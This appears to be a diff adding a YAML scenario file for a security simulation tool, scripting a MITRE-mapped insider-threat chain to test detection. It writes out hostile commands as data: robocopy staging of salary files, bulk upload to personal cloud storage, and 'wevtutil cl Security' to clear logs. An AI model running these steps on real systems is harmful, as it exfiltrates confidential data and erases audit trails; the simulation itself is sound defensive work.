@@ -1,0 +1,66 @@
+id: inject-insider-threat
+name: Insider Threat Inject Pack
+version: "1.0"
+description: |
+  Simulates a malicious insider exfiltrating data using legitimate tools.
+mitre_attack:
+  - T1078      # Valid Accounts
+  - T1083      # File and Directory Discovery
+  - T1005      # Data from Local System
+  - T1567.002  # Exfiltration to Cloud Storage
+
+injects:
+  - id: after-hours-login
+    type: identity_new_admin_user
+    delay_minutes: 0
+    params:
+      username: "{{ insider_user }}"
+      action: logon
+      logon_type: interactive
+      workstation: "{{ insider_workstation }}"
+      timestamp_override: "2024-03-15T23:45:00Z"
+
+  - id: file-discovery
+    type: simulated_execution
+    delay_minutes: 5
+    depends_on: after-hours-login
+    params:
+      technique: T1083
+      description: "Insider browses sensitive file shares"
+      process_name: "explorer.exe"
+      artifacts:
+        - type: file_access
+          paths:
+            - "\\\\fileserver\\hr\\salaries\\*"
+            - "\\\\fileserver\\engineering\\source\\*"
+            - "\\\\fileserver\\legal\\contracts\\*"
+
+  - id: data-staging
+    type: simulated_execution
+    delay_minutes: 15
+    depends_on: file-discovery
+    params:
+      technique: T1005
+      description: "Copy sensitive files to local staging directory"
+      process_name: "robocopy.exe"
+      command_line: "robocopy \\\\fileserver\\hr\\salaries C:\\Users\\{{ insider_user }}\\staging /E"
+
+  - id: cloud-exfil
+    type: http_burst
+    delay_minutes: 25
+    depends_on: data-staging
+    params:
+      target_url: "https://drive.google.com/upload"
+      method: POST
+      count: 50
+      description: "Upload staged files to personal cloud storage"
+
+  - id: log-clearing
+    type: simulated_execution
+    delay_minutes: 30
+    depends_on: cloud-exfil
+    params:
+      technique: T1070.001
+      description: "Clear Windows event logs to cover tracks"
+      process_name: "wevtutil.exe"
+      command_line: "wevtutil cl Security"
